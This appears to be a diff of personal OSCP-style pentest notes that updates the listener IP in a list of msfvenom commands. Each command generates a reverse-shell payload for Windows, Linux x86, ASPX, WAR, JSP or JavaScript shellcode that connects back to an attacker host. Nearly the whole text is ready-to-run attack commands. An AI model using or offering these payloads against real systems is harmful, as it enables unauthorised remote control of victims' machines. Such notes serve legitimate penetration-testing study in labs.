@@ -2,10 +2,10 @@
 https://gabb4r.gitbook.io/oscp-notes/shell/msfvenom
 
 # For Windows
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.238 LPORT=443 EXITFUNC=thread -f exe > binary.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.178 LPORT=443 EXITFUNC=thread -f exe > binary.exe
 
 # For Debian x84 (Not x64)
-msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.45.238 LPORT=443 -o shell
+msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.45.178 LPORT=443 -o shell
 
 # Keep in mind that you can encode the payloads
 
@@ -34,7 +34,7 @@ msfvenom -f aspx -p windows/x64/shell_reverse_tcp LHOST=$ip LPORT=443 -o shell64
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.179 LPORT=8080 -f war > shell.war
 
 # Jsp Reverse
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.238 LPORT=80 -f raw > shell.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.178 LPORT=80 -f raw > shell.jsp
 
 # Javascript Shellcode
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.179 LPORT=443 -f js_le -o shellcode
